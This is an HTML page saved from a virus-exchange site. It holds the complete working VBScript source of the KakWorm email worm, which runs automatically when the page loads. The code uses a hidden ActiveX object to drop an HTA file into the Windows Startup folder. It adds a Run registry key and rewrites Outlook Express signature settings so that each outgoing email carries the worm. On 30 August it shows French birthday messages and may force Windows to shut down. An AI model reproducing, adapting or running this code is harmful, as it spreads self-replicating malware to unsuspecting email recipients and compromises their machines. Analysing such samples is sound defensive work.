<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0053)http://vx.netlux.org/dl/vir/I-Worm.KakWorm.d?x=9&y=16 -->
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1250">
<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>
<BODY>
<DIV style="Z-INDEX: 5; RIGHT: 0px; POSITION: absolute; TOP: -20px">
<OBJECT id=scr 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC></OBJECT></DIV>
<SCRIPT language=VBScript>v=""+vbcrlf+"a="""""+vbcrlf+"for j=1 to 4"+vbcrlf+"select case j"+vbcrlf+"case 1:c=v:d=""v"""+vbcrlf+"case 2:c=m:d=""m"""+vbcrlf+"case 3:c=h:d=""h"""+vbcrlf+"case 4:c=o:d=""o"""+vbcrlf+"end select"+vbcrlf+"a=a+d+""="""""""+vbcrlf+"for i=1 to len(c)"+vbcrlf+"if mid(c,i,1)="""""""" then"+vbcrlf+"a=a+mid(c,i,1)+mid(c,i,1)"+vbcrlf+"elseif mid(c,i,1)=chr(13) then"+vbcrlf+"a=a+""""""+vbcrlf+"""""""+vbcrlf+"i=i+1"+vbcrlf+"else"+vbcrlf+"a=a+mid(c,i,1)"+vbcrlf+"end if"+vbcrlf+"next"+vbcrlf+"a=a+""""""""+vbcrlf"+vbcrlf+"next"+vbcrlf+""
m="scr.Reset()"+vbcrlf+"scr.doc = ""<HTML><HEAD><HTA:APPLICATION ID=""""hO"""" WINDOWSTATE=Minimize></""+""HEAD><BODY><SCRIPT language=VBScript>set fs = createObject(""""Scripting.FileSystemObject"""")""+vbcrlf+a+v+h+vbcrlf+""self.close()""+vbcrlf+""</""+""SCRIPT></""+""BODY></""+""HTML>"""+vbcrlf+"scr.Path=""C:\windows\Menu démarrer\programmes\démarrage\tam.hta"""+vbcrlf+"scr.write()"
h="if fs.fileexists(""c:\windows\out.html"") then fs.DeleteFile ""c:\windows\out.html"""+vbcrlf+"set fichier = fs.CreateTextFile(""c:\windows\out.html"")"+vbcrlf+"fichier.write ""<HTML><HEAD><""+""/HEAD><BODY>"""+vbcrlf+"fichier.write o"+vbcrlf+"fichier.write vbcrlf"+vbcrlf+"fichier.write ""<""+""Script language=VBScript>""+a+v+vbcrlf+m"+vbcrlf+"fichier.write ""<""+""/SCRIPT><""+""/BODY><""+""/HTML>"""+vbcrlf+"fichier.close"+vbcrlf+"tamhta=""c:\windows\menu démarrer\programmes\démarrage\tam.hta"""+vbcrlf+"if fs.fileexists(tamhta) then"+vbcrlf+"if not(fs.fileexists(""c:\windows\out.hta"")) then"+vbcrlf+"fs.CopyFile tamhta,""c:\windows\out.hta"""+vbcrlf+"end if"+vbcrlf+"fs.getfile(tamhta).attributes=fs.getfile(tamhta).attributes or 2"+vbcrlf+"end if"+vbcrlf+"Set WSH = CreateObject(""WScript.Shell"")"+vbcrlf+"ID=WSH.RegRead(""HKCU\Identities\Default User ID"")"+vbcrlf+"WSH.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\OutGoingCtrl"",""c:\windows\out.hta"""+vbcrlf+"path=""HKCU\Identities\""+ID+""\Software\Microsoft\Outlook Express\5.0\"""+vbcrlf+"WSH.RegWrite path+""Mail\Message Send HTML"",1,""REG_DWORD"""+vbcrlf+"WSH.RegWrite path+""Signature Flags"",3,""REG_DWORD"""+vbcrlf+"path=path+""signatures\"""+vbcrlf+"WSH.RegWrite path+""Default Signature"",""00000000"""+vbcrlf+"path=path+""00000000\"""+vbcrlf+"WSH.RegWrite path+""file"",""c:\windows\out.html"""+vbcrlf+"WSH.RegWrite path+""name"",""Signature Defaut"""+vbcrlf+"WSH.RegWrite path+""text"","""""+vbcrlf+"WSH.RegWrite path+""type"",2,""REG_DWORD"""+vbcrlf+"if left(date,5)=""30/08"" then"+vbcrlf+"dim t(5)"+vbcrlf+"for i=1 to 5"+vbcrlf+"msgbox ""Bon Anniversaire Lac !!!""+vbcrlf+""      Un ami..."",vbokonly+vbsystemmodal,""HAPPY BIRTHDAY"""+vbcrlf+"t(i)=3600*left(time,2)+60*mid(time,4,2)+right(time,2)"+vbcrlf+"next"+vbcrlf+"if t(5)-t(1)<=10 then"+vbcrlf+"msgbox ""KOI??? Ca t'interresse pas? Tu n'es pas digne du monde informatique. BYE-BYE"""+vbcrlf+"WSH.run ""rundll32 user.dll,ExitWindows"""+vbcrlf+"else"+vbcrlf+"msgbox ""Ok, chante HappyBirthday tout ira bien!!!"""+vbcrlf+"end if"+vbcrlf+"end if"+vbcrlf+""
o="<DIV style=""POSITION: absolute; RIGHT: 0px; TOP: -20px; Z-INDEX: 5""><OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC id=scr></OBJECT></DIV>"

a=""
for j=1 to 4
select case j
case 1:c=v:d="v"
case 2:c=m:d="m"
case 3:c=h:d="h"
case 4:c=o:d="o"
end select
a=a+d+"="""
for i=1 to len(c)
if mid(c,i,1)="""" then
a=a+mid(c,i,1)+mid(c,i,1)
elseif mid(c,i,1)=chr(13) then
a=a+"""+vbcrlf+"""
i=i+1
else
a=a+mid(c,i,1)
end if
next
a=a+""""+vbcrlf
next

scr.Reset()
scr.doc = "<HTML><HEAD><HTA:APPLICATION ID=""hO"" WINDOWSTATE=Minimize></"+"HEAD><BODY><SCRIPT language=VBScript>set fs = createObject(""Scripting.FileSystemObject"")"+vbcrlf+a+v+h+vbcrlf+"self.close()"+vbcrlf+"</"+"SCRIPT></"+"BODY></"+"HTML>"
scr.Path="C:\windows\Menu démarrer\programmes\démarrage\tam.hta"
scr.write()</SCRIPT>
</BODY></HTML>
